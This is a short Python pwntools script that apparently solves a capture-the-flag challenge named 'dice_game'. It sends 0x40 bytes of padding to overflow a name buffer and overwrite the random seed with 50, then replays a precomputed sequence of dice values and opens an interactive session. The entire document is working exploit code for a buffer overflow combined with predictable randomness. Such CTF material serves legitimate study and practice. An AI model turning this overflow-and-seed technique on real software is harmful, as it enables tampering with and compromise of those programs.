from pwn import *

context.log_level = "debug"
fpath = "./dice_game"
offset = 0x40

rand_list = [5,1,1,6,6,6,6,6,2,1,6,2,6,4,1,3,4,2,6,6,3,1,2,6,6,3,5,2,3,5,4,5,3,4,2,2,1,1,5,2,1,4,2,6,2,2,6,3,4,5] # seed = 50 # ubuntu

p = process(fpath)

p.recvuntil("name: ")
# gdb.attach(p)
payload = offset * 'a' + p64(50)
p.sendline(payload)
for i in range(50):
	p.recvuntil(": ")
	p.sendline(str(rand_list[i]))
	p.recvuntil("\n")
p.interactive()
